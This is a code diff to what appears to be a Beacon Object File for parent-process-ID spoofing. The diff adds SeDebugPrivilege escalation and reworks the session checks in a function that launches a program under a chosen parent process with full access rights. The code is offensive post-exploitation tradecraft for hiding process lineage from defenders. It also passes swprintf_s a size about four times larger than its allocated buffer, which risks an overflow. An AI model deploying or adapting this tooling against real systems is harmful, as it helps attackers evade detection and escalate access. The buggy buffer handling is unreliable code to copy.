@@ -5,16 +5,18 @@
 #define NtCurrentThread()         ((HANDLE)(LONG_PTR)-2)
 #define STATUS_SUCCESS 0x00000000
 
+#ifndef  NT_SUCCESS
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+#endif // ! NT_SUCCESS
+
 //void ___chkstk_ms() { /* needed to resolve linker errors for bof_extract */ }
 
-int my_toLower(int x)
+int my_toLower(int c)
 {
-        if (x >= 'A' && x <= 'Z')
-        {
-                return x + 32;
-        }
-
-        return x;
+    if (c >= L'A' && c <= L'Z') {
+        return c + 32;
+    }
+    return c;
 }
 
 int my_wcsicmp(wchar_t const* s1, wchar_t const* s2)
@@ -89,11 +91,40 @@ HANDLE find_process_by_name(const wchar_t* processname) //Find PID of specified 
     return hResult;
 }
 
+BOOL EnableSeDebugPrivilege()
+{
+	ULONG t;
+	// 20: SeDebugPrivilege
+	if (!NT_SUCCESS(RtlAdjustPrivilege(20, TRUE, FALSE, &t))) {
+		return FALSE;
+	}
+	return TRUE;
+}
+
 void spf(DWORD ppid, wchar_t* program, wchar_t* commandLineArgs)
 {
     HANDLE hParent = NULL;
-    DWORD currentSessionId = 0;
-    DWORD targetSessionId = 0;
+    DWORD currentSessionId = 0, targetSessionId = 0;
+
+    if(IsProcessElevated())
+    {
+        if(EnableSeDebugPrivilege())
+        {
+            internal_printf("EnableSeDebugPrivilege Successfully\n");
+        }
+        else {
+            internal_printf("EnableSeDebugPrivilege Failed\n");
+        }
+    }else {
+        ProcessIdToSessionId(GetCurrentProcessId(), &currentSessionId);
+        ProcessIdToSessionId(ppid, &targetSessionId);
+
+        // Determine whether the ppid session is the same as the current session. If the current process has UAC privileges, it can be executed successfully
+        if(currentSessionId != targetSessionId) {
+            internal_printf("The parent PID session is different from the current session, and the spawn failed\n", ppid, GetLastError());
+            return;
+        }
+    }
     //Retrieve a handle to parent process for PPID spoofing if one was supplied
     /*if(wcslen(parentname) > 0)
     {
@@ -104,15 +135,6 @@ void spf(DWORD ppid, wchar_t* program, wchar_t* commandLineArgs)
             return;
         }
     }*/
-
-    ProcessIdToSessionId(GetCurrentProcessId(), &currentSessionId);
-    ProcessIdToSessionId(ppid, &targetSessionId);
-
-    // Determine whether the ppid session is the same as the current session. If the current process has UAC privileges, it can be executed successfully
-    if(currentSessionId != targetSessionId) {
-        internal_printf("The parent PID session is different from the current session, and the spawn failed\n", ppid, GetLastError());
-        return;
-    }
 
     // Get ParenetID Handle
     hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ppid);
@@ -129,12 +151,11 @@ void spf(DWORD ppid, wchar_t* program, wchar_t* commandLineArgs)
     UNICODE_STRING CommandLine;
     UNICODE_STRING CurrentDirectory;
 
-    // wchar_t * program = L"F:\\zzz\\minio.exe";
     //Convert program name to NtPathName
     if (!RtlDosPathNameToNtPathName_U(program, &NtImagePath, NULL, NULL))
     {
         internal_printf("Error: Unable to convert path name\n");
-	return;
+        return;
     }
 
     //Parse out program name and increment pointer by one to skip the leading backslash
@@ -150,16 +171,15 @@ void spf(DWORD ppid, wchar_t* program, wchar_t* commandLineArgs)
     int commandline_len = wcslen(program) + wcslen(commandLineArgs);
     if (commandline_len > 8192)
     {
-	internal_printf("Current command line length: %d, exceeding the maximum limit of 8192.\n",commandline_len);
+		internal_printf("Current command line length: %d, exceeding the maximum limit of 8192.\n",commandline_len);
         return;
     }
 
     wchar_t * cline = intAlloc(8192);
-    swprintf_s(cline, 8192, L"%ls%ls", program, commandLineArgs);
+    swprintf_s(cline, 8192 * 2, L"%ls%ls", program, commandLineArgs);
     RtlInitUnicodeString(&CommandLine, cline);
 
     //Assemble current directory for process parameters
-    //wchar_t * currdir= L"F:\\zzz\\";
 
     wchar_t * procname = wcsrchr(program, L'\\') + 1;
     wchar_t currdir[MAX_PATH] = {0};
